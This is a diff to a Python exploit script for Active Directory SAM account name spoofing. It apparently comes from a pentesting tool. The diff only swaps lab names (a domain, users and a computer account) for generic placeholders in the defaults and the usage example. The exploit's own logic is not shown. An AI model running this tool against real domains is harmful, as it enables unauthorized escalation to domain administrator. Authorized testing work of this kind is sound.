@@ -11,7 +11,7 @@ from ldap3.core.exceptions import LDAPCursorError, LDAPBindError
 
 
 class SamExploit:
-	def __init__(self, options, computer_name='OCD_COMPUTER$', computer_pass='ocd_computer_p4ss!', method='SAMR'):
+	def __init__(self, options, computer_name='test$', computer_pass='test_p4ss!', method='SAMR'):
 		self.options = options
 
 		self.dc_name = options.dc_name
@@ -202,7 +202,7 @@ class SamExploit:
 if __name__ == '__main__':
 	"""
 	Exemple:
-		python3 sam_spoof.py -dc-name DRAGONSTONE -domain-name sevenkingdoms.local -dc-ip 192.168.56.11 -u arya.stark -p needle -target-da eddard.stark
+		python3 sam_spoof.py -dc-name dc -domain-name domain -dc-ip 192.168.56.11 -u arya -p needle -target-da eddard
 	"""
 	parser = argparse.ArgumentParser(add_help = True, description = "Sam account spoofing exploit")
 	parser.add_argument('-dc-name', action='store', metavar = "DC name", help='Hostname of the domain controller to use')
@@ -225,7 +225,7 @@ if __name__ == '__main__':
 		warn(f'DC hostname / ip  and user/password should be specified:\n\t- python3 {sys.argv[0]} -dc-host <host> -dc-ip <ip> -u <username> -p <password>')
 		exit(0)
 
-	log("Don't forget to remove computer after test: OCD_COMPUTER$")
+	log("Don't forget to remove computer after test: test$")
 
 	### dc_name, domain_name, dc_ip, username, password
 	SamAdmin = SamExploit(options)
